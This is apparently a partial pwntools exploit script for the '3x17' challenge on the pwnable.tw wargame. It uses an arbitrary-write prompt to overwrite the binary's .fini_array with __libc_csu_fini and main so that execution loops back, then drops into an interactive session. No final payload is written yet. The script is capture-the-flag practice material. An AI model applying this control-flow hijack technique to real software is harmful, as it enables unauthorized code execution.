#!/usr/bin/env python3
from pwn import *
from sys import argv
context(arch='amd64')
binary = ELF('3x17', checksec=0)
#libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10105)
else:
  p = binary.process(env={})

s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)

pause()
fini_array0 = 0x004b40f0
fini_array1 = fini_array0 + 8
main = 0x00401b6d
libc_csu_fini = 0x00402960

def write_addr(addr, data):
  log.info("writing %s to address %#lx"%(data, addr))
  s(str(addr).encode(), b"addr:")
  s(data, b"data:")

payload = b""


write_addr(fini_array0, p64(libc_csu_fini) + p64(main))



p.interactive()

